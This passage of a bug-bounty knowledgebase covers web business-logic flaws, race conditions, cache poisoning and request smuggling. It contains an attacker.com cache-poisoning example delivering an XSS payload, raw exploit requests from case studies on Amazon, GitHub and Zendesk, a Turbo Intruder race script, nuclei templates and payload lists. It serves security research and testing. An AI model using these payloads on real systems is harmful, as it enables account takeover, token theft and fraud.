X-Forwarded-Host: attacker.com

# Response:
<body data-site-root="https://attacker.com/">

# JavaScript loads translations from attacker domain
GET /api/i18n/en HTTP/1.1
Host: attacker.com

# Response:
{"Show more": "<svg onload=alert(1)>"}
```

---

## Real World Case Studies

### Case Study 1: GitLab Email Verification Race Condition (CVE-2022-4037)

**Vulnerability**: Single-endpoint race condition in email change functionality.

**Discovery**:
```http
# Probe: Change email to two addresses simultaneously
POST /-/profile HTTP/2
Host: gitlab.com

user[email]=test1@psres.net
# + parallel request with test2@psres.net
```

**Result**: Email sent to test2@psres.net containing confirmation token for test1@psres.net.

**Root Cause**: Devise framework inconsistency between where to send email (argument) and what to put in email body (database read).

**Impact**: Email verification bypass → invitation hijacking → OpenID account hijacking.

### Case Study 2: Amazon H2.0 Desync

**Vulnerability**: HTTP/2 request without Content-Length caused Amazon to ignore CL on /b/ endpoints.

**Exploit**:
```http
POST /b/ HTTP/2
Host: www.amazon.com
Content-Length: 23

GET /404 HTTP/1.1
X: X
```

**Result**: Stored other users' complete requests (including auth tokens) in attacker's shopping list.

**Missed Opportunity**: Could have created self-replicating desync worm via fetch() + XSS gadget.

### Case Study 3: Cloudflare Internal Desync (24M Websites)

**Vulnerability**: HTTP/1.1 desync internal to Cloudflare's infrastructure affecting Heroku-hosted sites.

**Impact**: 24,000,000+ websites exposed to complete site takeover.

**Bounty**: $7,000

### Case Study 4: Mozilla SHIELD Hijacking

**Vulnerability**: X-Forwarded-Host header poisoned Firefox's recipe fetching system.

**Impact**: Potential to direct tens of millions of Firefox users to attacker-controlled recipes.

**Bounty**: $1,000

### Case Study 5: GitHub Fat GET ($10,000)

**Vulnerability**: Varnish forwarded GET body without including body params in cache key.

**Exploit**:
```http
GET /contact/report-abuse?report=albinowax HTTP/1.1
Host: github.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 22

report=innocent-victim
```

**Impact**: Cache poisoning allowed changing any parameter on cacheable pages.

### Case Study 6: Zendesk Login CSRF via Fat GET

**Vulnerability**: Rails behind Cloudflare allowed GET body parameter override.

**Exploit**:
```http
GET /en-us/signin HTTP/1.1
Host: example.zendesk.com
Content-Length: 200

return_to=/access/logout?return_to=/./access/return_to?flash_digest=token
```

**Impact**: Users logging in were redirected through logout → login chain → logged into attacker's account.

### Case Study 7: Facebook Email Confirmation Race (2016)

**Vulnerability**: Changing Facebook email to two addresses simultaneously.

**Result**: Confirmation email contained two distinct codes, one for each address.

**Impact**: Email confirmation bypass.

### Case Study 8: Rounding Error Money Generation (HackerOne #176461)

**Vulnerability**: Cryptocurrency platform rounding error in internal transfers.

**Exploit**:
```
Transfer: 0.000000005 XBT (0.5 satoshi, below 1 satoshi minimum)
Sender: Rounded down to 0 (no deduction)
Receiver: Rounded up to 1 satoshi (credit)
Result: Generated 0.00000001 XBT from nothing
```

**Automation**: No rate limit, OTP, or fraud detection → infinite money printing.

---

## Fuzzing Payloads

### Business Logic Fuzzing Wordlist

```
# Numeric edge cases
-1
0
1
2147483647
2147483648
-2147483648
9223372036854775807
9223372036854775808
1e309
0.0
-0.0
NaN
Infinity
-Infinity
null
undefined

# String edge cases
""
"null"
"undefined"
"true"
"false"
"[]"
"{}"
"0"
"-1"
"admin"
"true"
"1"

# Boolean confusion
1
0
true
false
yes
no
on
off

# Array/Object injection
[]
[1,2,3]
{}
{"key": "value"}
null

# Time-based
2024-13-01
2024-00-01
0000-00-00
99:99:99
-1 days
+999 years
```

### Parameter Discovery

```
# Common hidden parameters
role, is_admin, is_staff, is_premium, is_verified
account_type, user_type, access_level, permission
credit, balance, amount, price, discount
created_at, updated_at, deleted_at, expires_at
internal, debug, test, staging, dev
```

### Workflow State Fuzzing

```
# Common state parameters
status=pending, status=approved, status=rejected
state=init, state=processing, state=complete
step=1, step=2, step=3
phase=alpha, phase=beta, phase=prod
action=create, action=update, action=delete, action=approve
```

---

## Automation Workflows

### Recon Pipeline

```bash
# Step 1: Subdomain enumeration
subfinder -d target.com -o subs.txt

# Step 2: HTTP probing
httpx -l subs.txt -o alive.txt -status-code -tech-detect

# Step 3: Crawling
katana -list alive.txt -o endpoints.txt -jc -kf -d 5

# Step 4: URL analysis
cat endpoints.txt | grep -E '\?|&' | sort -u > params.txt

# Step 5: Parameter discovery
# Use Param Miner (Burp extension) for hidden params
# Use Arjun for parameter brute forcing
```

### Race Condition Automation

```python
# Turbo Intruder template for limit overrun
# race-single-packet-attack.py

def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                          concurrentConnections=1,
                          engine=Engine.BURP2)

    for i in range(20):
        engine.queue(target.req, gate='1')

    engine.openGate('1')

def handleResponse(req, interesting):
    table.add(req)
```

### Cache Poisoning Detection

```bash
# Param Miner + Burp Suite
# 1. Install Param Miner extension
# 2. Right-click request → "Guess headers"
# 3. Look for unkeyed inputs affecting response
# 4. Test cacheability with cache-buster

# Manual cache oracle selection
# - Cacheable endpoint
# - Visible hit/miss indicator
# - URL or parameter reflection
```

### Business Logic Scanner Logic

```python
# Conceptual nuclei template structure for business logic
id: business-logic-test

info:
  name: Business Logic Test Template
  author: researcher
  severity: info

http:
  - method: POST
    path:
      - "{{BaseURL}}/api/action"

    payloads:
      test_values:
        - "-1"
        - "0"
        - "999999999"
        - "null"
        - "true"

    body: |
      param={{test_values}}

    matchers:
      - type: word
        words:
          - "success"
          - "approved"
          - "completed"
        condition: or
```

---

## Recon Methodology

### Phase 1: Application Mapping

```
1. Identify all user roles and privilege levels
2. Map complete workflow diagrams
3. Identify state transitions and decision points
4. Document business rules and constraints
5. Identify multi-step processes
6. Map API endpoints and their relationships
```

### Phase 2: Trust Boundary Analysis

```
1. Identify client-side controls (can they be bypassed?)
2. Map server-side validation points
3. Identify assumptions about user behavior
4. Test parameter removal/modification
5. Test workflow step skipping
6. Test state manipulation
```

### Phase 3: Race Condition Hunting

```
1. Identify security-critical endpoints
2. Check for collision potential (same record operations)
3. Determine state storage (persistent vs client-side)
4. Identify operation type (edit vs append)
5. Determine operation key (session, user ID, etc.)
6. Probe with single-packet attack
7. Look for clues (response deviations, emails, behavior changes)
```

### Phase 4: Domain-Specific Testing

```
E-Commerce:
- Price manipulation, discount abuse, coupon stacking
- Cart manipulation, negative quantities
- Shipping fee abuse, currency arbitrage
- Refund abuse, chargeback gaming

Financial:
- Transfer limits, rounding errors
- Interest calculation abuse
- Transaction ordering abuse
- Balance manipulation

Social Media:
- Follower manipulation, like farming
- Content moderation bypass
- Account verification bypass
- Rate limit evasion

SaaS:
- Feature access without subscription
- Seat/license manipulation
- Trial abuse, plan downgrade retention
- API quota manipulation
```

---

## Nuclei Templates

### Template Logic for Business Logic

```yaml
id: business-logic-price-manipulation

info:
  name: Price Manipulation Test
  author: researcher
  severity: high
  description: Tests for price manipulation vulnerability

http:
  - raw:
      - |
        POST /cart/add HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/json

        {"product_id": 1, "quantity": 1, "price": -100}

    matchers:
      - type: word
        words:
          - "success"
          - "added"
          - "cart"
        condition: or

      - type: status
        status:
          - 200
          - 201
```

```yaml
id: race-condition-test

info:
  name: Race Condition Detection
  author: researcher
  severity: critical
  description: Tests for race condition vulnerability

http:
  - raw:
      - |
        POST /api/redeem HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/json

        {"code": "TEST-CODE-123"}

    threads: 20
    race: true
    race_count: 20

    matchers:
      - type: word
        words:
          - "redeemed"
          - "success"
        condition: or
```

```yaml
id: workflow-bypass-test

info:
  name: Workflow Step Bypass
  author: researcher
  severity: high

http:
  - raw:
      - |
        GET /admin/dashboard HTTP/1.1
        Host: {{Hostname}}
        Cookie: {{session_cookie}}

    matchers:
      - type: word
        words:
          - "dashboard"
          - "admin"
          - "panel"
        condition: or

      - type: status
        status:
          - 200
```

---

## Tools and Scanners

### Burp Suite Extensions

| Extension | Purpose |
|-----------|---------|
| **Turbo Intruder** | Race condition exploitation, single-packet attacks |
| **HTTP Request Smuggler** | Request smuggling detection (v3.0 for parser discrepancies) |
| **Param Miner** | Hidden parameter discovery, cache poisoning detection |
| **Autorize** | Authorization testing |
| **Burp Bounty** | Custom scan checks |
| **Flow** | Request flow analysis |
| **WSDL Wizard** | SOAP API testing |

### ProjectDiscovery Tools

```bash
# httpx - Fast HTTP probing
httpx -l targets.txt -o alive.txt -status-code -tech-detect -title

# katana - Web crawler
katana -u https://target.com -o endpoints.txt -jc -kf -d 5 -aff

# nuclei - Vulnerability scanner
nuclei -l alive.txt -t nuclei-templates/ -o results.txt

# subfinder - Subdomain enumeration
subfinder -d target.com -o subs.txt

# naabu - Port scanner
naabu -list subs.txt -top-ports 1000

# interactsh - OOB interaction
interactsh-client

# notify - Notification framework
notify -provider slack
```

### Specialized Tools

```bash
# smuggler - HTTP request smuggling
cat targets.txt | python3 smuggler.py

# http-request-smuggler (PortSwigger)
# Install via BApp Store

# postMessage-tracker
# Chrome extension for postMessage analysis

# pp-finder - Prototype pollution scanner
pp-finder -u https://target.com

# cariddi - Crawler + secrets finder
cariddi -u https://target.com

# CursedChrome - Chrome extension exploitation
```

### Wordlists

```
SecLists/Fuzzing/ - General fuzzing payloads
SecLists/Discovery/Web-Content/ - Web content discovery
PayloadsAllTheThings/ - Categorized payloads by vulnerability type
```

---

## Advanced Research

### PortSwigger Research Highlights

#### Smashing the State Machine (2023)
- **Innovation**: Single-packet attack for reliable race condition exploitation
- **Key Finding**: "Everything is multi-step" — every request has sub-states
- **Impact**: #1 Web Hacking Technique of 2023
- **Tooling**: Turbo Intruder single-packet-attack.py template

#### Browser-Powered Desync (2022)
- **Innovation**: Client-side desync attacks via browser fetch()
- **Key Finding**: Browsers can trigger desync on single-server websites
- **Impact**: Compromised Akamai, Varnish, Apache, AWS ALB, web VPNs
- **Tooling**: HTTP Request Smuggler CSD detection

#### Web Cache Entanglement (2020)
- **Innovation**: Cache key transformation exploitation
- **Key Finding**: Cache key normalization creates exploitable gaps
- **Impact**: Poisoned every page on major newspaper, DoD admin panel, Firefox updates
- **Tooling**: Param Miner cache-buster + scan

#### HTTP/1 Must Die (2025)
- **Innovation**: Expect-based desync, 0.CL deadlock breaking
- **Key Finding**: HTTP/1.1 fundamentally insecure, HTTP/2+ required
- **Impact**: $200,000+ in bounties in 2 weeks, 24M websites exposed
- **Tooling**: HTTP Request Smuggler v3.0 parser discrepancy detection

### Emerging Research Areas

1. **Deferred Race Conditions**: Background batch processing collisions
2. **Parser Confusion Chains**: Multi-layer parsing discrepancies
3. **State Machine Complexity**: ORM-hidden transaction dangers
4. **HTTP/3 Desync**: New protocol, new attack surface
5. **GraphQL Business Logic**: Query complexity, depth, batching abuse
6. **WebSocket State Abuse**: Persistent connection state manipulation

---

## Bug Bounty Writeups

### Key Writeups and Findings

| Researcher | Target | Vulnerability | Bounty |
|------------|--------|--------------|--------|
| James Kettle | GitLab | Email verification race | Medium (CVE-2022-4037) |
| James Kettle | Amazon | H2.0 Desync | Undisclosed |
| James Kettle | Cloudflare | Internal desync | $7,000 |
| James Kettle | Mozilla | SHIELD hijacking | $1,000 |
| James Kettle | GitHub | Fat GET poisoning | $10,000 |
| James Kettle | Zendesk | Login CSRF via fat GET | Undisclosed |
| James Kettle | Various | HTTP/1 Must Die | $200,000+ (2 weeks) |
| HackerOne #176461 | Crypto Platform | Rounding error | Undisclosed |
| 0xspade | Various | Business logic collection | Multiple |

### Common Bounty Patterns

```
High payouts:
- Financial impact (money generation, theft)
- Mass account takeover
- Authentication bypass
- Persistent XSS + cache poisoning

Medium payouts:
- Workflow bypass
- Feature abuse
- Information disclosure

Low payouts:
- Debug info leakage
- Minor state inconsistencies
```

---

## Payload Collections

### Complete Payload Matrix

```
┌────────────────────┬────────────────────────────────────────────────┐
│ Category           │ Payloads                                       │
├────────────────────┼────────────────────────────────────────────────┤
│ Numeric Abuse      │ -1, 0, 2147483647, 9223372036854775808,       │
│                    │ 1e309, 0.9999999999999999, NaN, Infinity       │
├────────────────────┼────────────────────────────────────────────────┤
│ Boolean Abuse      │ true, false, 1, 0, yes, no, on, off, [], {}    │
├────────────────────┼────────────────────────────────────────────────┤
│ Parameter Pollution│ param=1&param=2, param[]=1&param[]=2,          │
│                    │ param[key]=value                               │
├────────────────────┼────────────────────────────────────────────────┤
│ Type Confusion     │ {"id": "123"} → {"id": ["123"]},               │
│                    │ {"count": null} vs {"count": 0}                │
├────────────────────┼────────────────────────────────────────────────┤
│ State Manipulation │ status=approved, step=final, action=delete,    │
│                    │ is_admin=true, role=administrator              │
├────────────────────┼────────────────────────────────────────────────┤
│ Workflow Bypass    │ Skip /verify, access /admin directly,          │
│                    │ POST /confirm without /payment                 │
├────────────────────┼────────────────────────────────────────────────┤
│ Race Condition     │ 20-30 parallel requests, single-packet attack,  │
│                    │ Turbo Intruder gates                           │
├────────────────────┼────────────────────────────────────────────────┤
│ Coupon Abuse       │ CODE1, CODE2, SAVE10, WELCOME, sequential      │
│                    │ brute force, stacking via HPP                  │
├────────────────────┼────────────────────────────────────────────────┤
│ Cache Poisoning    │ X-Forwarded-Host, X-Host, X-Original-URL,     │
│                    │ unkeyed parameter reflection                   │
├────────────────────┼────────────────────────────────────────────────┤
│ Request Smuggling  │ CL.TE, TE.CL, H2.CL, CL.0, 0.CL, Expect-based  │
├────────────────────┼────────────────────────────────────────────────┤
│ OAuth Abuse        │ logo_uri SSRF, redirect_uri poisoning,         │
│                    │ WebFinger enumeration                            │
├────────────────────┼────────────────────────────────────────────────┤
│ IDOR Chains        │ /api/users/123 → /api/users/456,                 │
│                    │ /admin/orders/123/cancel                       │
└────────────────────┴────────────────────────────────────────────────┘
```

---

## Detection Techniques

### Manual Detection

```
1. Map the application
   - Create workflow diagrams
   - Identify all state transitions
   - Document business rules

2. Identify assumptions
   - What does the developer assume about users?
   - What validation exists and where?
   - What happens at each workflow boundary?

3. Test unconventional input
   - Negative numbers, zero, max values
   - Missing parameters, extra parameters
   - Wrong data types, encoding variations

4. Test workflow abuse
   - Skip steps, replay steps, reverse order
   - Access later steps directly
   - Remove critical parameters

5. Test race conditions
   - Send parallel requests
   - Use single-packet attack
   - Look for timing-dependent behavior

6. Test trust boundaries
   - Modify client-side values
   - Tamper with tokens/cookies
   - Bypass client-side validation
```

### Automated Detection

```
1. Crawl all endpoints (katana)
2. Identify parameters (Param Miner, Arjun)
3. Fuzz with edge cases (nuclei custom templates)
4. Test for race conditions (Turbo Intruder)
5. Test for cache poisoning (Param Miner)
6. Test for request smuggling (HTTP Request Smuggler)
7. Monitor for anomalies (interactsh, Burp Collaborator)
```

### Second-Order Detection

```
1. Monitor emails for unexpected content
2. Check application state after operations
3. Verify resource creation/modification
4. Cross-reference multiple endpoints for consistency
5. Look for deferred effects (background processing)
```

---

## References

### PortSwigger Resources
- [Business Logic Vulnerabilities](https://portswigger.net/web-security/logic-flaws)
- [Business Logic Examples](https://portswigger.net/web-security/logic-flaws/examples)
- [Race Conditions](https://portswigger.net/web-security/race-conditions)
- [Smashing the State Machine](https://portswigger.net/research/smashing-the-state-machine)
- [Browser-Powered Desync](https://portswigger.net/research/browser-powered-desync-attacks)
- [Web Cache Entanglement](https://portswigger.net/research/web-cache-entanglement)
- [Practical Web Cache Poisoning](https://portswigger.net/research/practical-web-cache-poisoning)
- [HTTP/1 Must Die](https://portswigger.net/research/http1-must-die)
- [Hidden OAuth Attack Vectors](https://portswigger.net/research/hidden-oauth-attack-vectors)
- [Top 10 Web Hacking Techniques 2023](https://portswigger.net/research/top-10-web-hacking-techniques-of-2023)

### GitHub Resources
- [PayloadsAllTheThings - Business Logic](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Business%20Logic%20Errors)
- [0xspade Bug Bounty - Business Logic](https://github.com/0xspade/bugbounty/tree/master/business-logic)
- [Nuclei Templates](https://github.com/projectdiscovery/nuclei-templates)
- [ProjectDiscovery Tools](https://github.com/projectdiscovery)
- [HTTP Request Smuggler](https://github.com/PortSwigger/http-request-smuggler)
- [Param Miner](https://github.com/PortSwigger/param-miner)
- [Turbo Intruder](https://github.com/PortSwigger/turbo-intruder)

### Documentation
- [HackTricks - Business Logic](https://book.hacktricks.wiki/en/pentesting-web/business-logic-vulnerabilities.html)
- [OWASP Business Logic](https://owasp.org/www-community/vulnerabilities/Business_logic_vulnerability)
- [MDN Fetch API](https://developer.mozilla.org/en-US/docs/Web/API/Fetch_API)
- [MDN HTTP Methods](https://developer.mozilla.org/en-US/docs/Web/HTTP/Methods)
- [MDN postMessage](https://developer.mozilla.org/en-US/docs/Web/API/Window/postMessage)

### Research Papers
- "Smashing the State Machine: The true potential of web race conditions" (Black Hat USA 2023)
- "Browser-Powered Desync Attacks" (Black Hat USA 2022)
- "Web Cache Entanglement: Novel Pathways to Poisoning" (Black Hat USA 2020)
- "Practical Web Cache Poisoning" (2018)
- "HTTP/1 Must Die: The desync endgame" (DEF CON 2025)
- "HTTP Desync Attacks: Request Smuggling Reborn" (2019)
- "HTTP/2: The Sequel is Always Worse" (2021)

### Bug Bounty Platforms
- HackerOne
- Bugcrowd
- Intigriti
- YesWeHack
- Open Bug Bounty

---

## Quick Reference Cards

### Race Condition Testing Checklist
```
□ Identify security-critical endpoints
□ Check for collision potential (same record)
□ Determine state storage location
□ Identify operation type (edit vs append)
□ Determine operation key
□ Send 20-30 parallel requests (single-packet)
□ Benchmark normal behavior
□ Look for response deviations
□ Check second-order effects (emails, state)
□ Prove with minimal requests (2)
□ Escalate impact
```

### Business Logic Testing Checklist
```
□ Map all workflows and state transitions
□ Identify trust boundaries
□ Test client-side control bypass
□ Test unconventional input (negative, zero, max)
□ Test parameter removal/addition
□ Test workflow step skipping
□ Test race conditions
□ Test for mass assignment
□ Test for type confusion
□ Verify business rules are enforced server-side
```

### Cache Poisoning Testing Checklist
```
□ Identify cache oracle (cacheable + hit/miss visible)
□ Probe cache key handling (transformation, normalization)
□ Test unkeyed inputs (headers, cookies)
□ Test parameter cloaking
□ Test fat GET
□ Test cache key injection
□ Find gadget for exploitation
□ Verify poisoning persists
□ Check geographic cache distribution
```

---

*This knowledgebase is a living document. As business logic vulnerabilities are inherently application-specific, the techniques and payloads here should be adapted to the specific context of each target. The key to finding these vulnerabilities is understanding the application's business rules and identifying where they can be creatively violated.*

> **"Logic flaws are often invisible to people who aren't explicitly looking for them."** - PortSwigger Web Security Academy
